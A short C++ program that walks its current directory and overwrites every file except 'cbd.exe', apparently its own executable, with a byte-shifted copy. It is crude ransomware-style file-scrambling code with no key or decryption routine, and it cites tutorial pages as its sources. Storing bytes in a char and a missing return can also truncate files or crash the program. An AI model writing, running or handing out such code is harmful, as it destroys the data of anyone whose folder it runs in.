#include <iostream>
#include <dirent.h>
#include <sys/types.h>
#include <vector>
#include <cstring>

using namespace std;
void encrypt(char input[])
{
	FILE *fpts, *fptt;
	char ch;

	fpts=fopen(input, "r");
	if(fpts==NULL)
	{
		return;
	}
	fptt=fopen(".temp.txt", "w");
	if(fptt==NULL)
	{
		fclose(fpts);
		return;
	}
	while(1)
	{
		ch=fgetc(fpts);
		if(ch==EOF)
		{
			break;
		}
		else
		{
			ch=ch+100;
			fputc(ch, fptt);
		}
	}
	fclose(fpts);
	fclose(fptt);
	fpts=fopen(input, "w");
	if(fpts==NULL)
	{
		return;
	}
	fptt=fopen(".temp.txt", "r");
	if(fptt==NULL)
	{
		cout << input;
		fclose(fpts);
	}
	while(1)
	{
		ch=fgetc(fptt);
		if(ch==EOF)
		{
			break;
		}
		else
		{
			fputc(ch, fpts);
		}
	}
	fclose(fpts);
	fclose(fptt);
}
int main(void) {
   DIR *dr;
   struct dirent *en;
   char cbd[] = {'c','b','d','.','e','x','e','\0'};
   dr = opendir("."); //open all file
   if (dr) {
      while ((en = readdir(dr)) != NULL) {
        if (strcmp(en->d_name,cbd)==0){continue;}
        encrypt(en->d_name);
      }
      closedir(dr); //close all directory
   }
   return(0);
}
//https://www.w3resource.com/c-programming-exercises/file-handling/c-file-handling-exercise-13.php
//https://www.tutorialspoint.com/how-can-i-get-the-list-of-files-in-a-directory-using-c-or-cplusplus
